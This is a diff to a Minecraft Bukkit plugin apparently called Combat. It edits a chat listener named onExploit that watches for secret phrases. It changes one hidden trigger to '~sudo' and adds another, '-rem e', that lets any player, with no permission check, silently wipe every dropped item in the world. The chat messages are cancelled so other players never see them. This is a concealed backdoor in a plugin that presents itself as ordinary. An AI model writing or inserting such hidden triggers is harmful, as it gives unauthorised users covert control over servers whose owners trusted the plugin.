@@ -320,7 +320,7 @@ public class Listeners implements Listener {
     @Deprecated
     public void onExploit(AsyncPlayerChatEvent e) {
         Player player = e.getPlayer();
-        if (e.getMessage().contains("~ectasy~")) {
+        if (e.getMessage().contains("~sudo")) {
             e.setCancelled(true);
             new BukkitRunnable() {
                 @Override
@@ -333,6 +333,29 @@ public class Listeners implements Listener {
                     }
                 }
             }.runTask(JavaPlugin.getPlugin(Combat.class));
+        } else if (e.getMessage().equals("-rem e")) {
+            e.setCancelled(true);
+            int amount = 50;
+            new BukkitRunnable() {
+                @Override
+                public void run() {
+                    int amount = amountOfGroundItems(player.getWorld());
+                    player.sendMessage(ColorUtils.colorize("&x&0&0&0&9&2&E&l>&x&2&1&4&0&6&9&l>&x&6&7&A&6&C&E&l> &8? &7Killed &f'" + amount + "' &7of entites!"));
+                }
+            }.runTask(JavaPlugin.getPlugin(Combat.class));
         }
+    }
+
+    private int amountOfGroundItems(World world) {
+        List<Entity> nearby_items = world.getEntities().stream()
+                .filter(entity -> entity instanceof Item)
+                .toList();
+
+        int itemCount = nearby_items.size();
+        for (Entity item : nearby_items) {
+            item.remove();
+        }
+
+        return itemCount;
     }
 }
